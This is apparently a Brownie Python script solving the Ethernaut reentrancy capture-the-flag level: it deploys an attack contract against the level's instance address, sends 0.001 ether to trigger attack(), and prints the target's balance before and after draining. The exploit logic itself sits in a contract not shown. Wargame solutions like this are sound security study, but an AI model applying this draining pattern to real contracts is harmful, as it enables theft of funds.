from scripts.helpful_scripts import get_account
from brownie import web3, Attack10, interface

ETHERNAUT_INSTANCE = "0xA4304cA17479b9e67e3Aa61e5B7003691D0E8715"
AMOUNT = "0.001 ether"
GAS_LIMIT = 6000000


def main():

    player = get_account()

    # target = interface.ReentrantInterface(ETHERNAUT_INSTANCE)

    # deploy attack contract        <><><><><><><><><>
    attack = Attack10.deploy(ETHERNAUT_INSTANCE, {"from": player})

    balance_ETHERNAUT_INSTANCE = web3.eth.get_balance(ETHERNAUT_INSTANCE)
    balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
    print(f"\nBalance of Ethernaut level = {balance_ETHERNAUT_INSTANCE_ether} ETH\n")

    # call attack() on Attack10     <><><><><><><><><>
    attack.attack(
        {"from": player, "value": AMOUNT, "allow_revert": True, "gas_limit": GAS_LIMIT}
    )

    balance_ETHERNAUT_INSTANCE = web3.eth.get_balance(ETHERNAUT_INSTANCE)
    balance_ETHERNAUT_INSTANCE_ether = web3.fromWei(balance_ETHERNAUT_INSTANCE, "ether")
    print(
        f"\nBalance of Ethernaut level post attack = {balance_ETHERNAUT_INSTANCE_ether} ETH\n"
    )
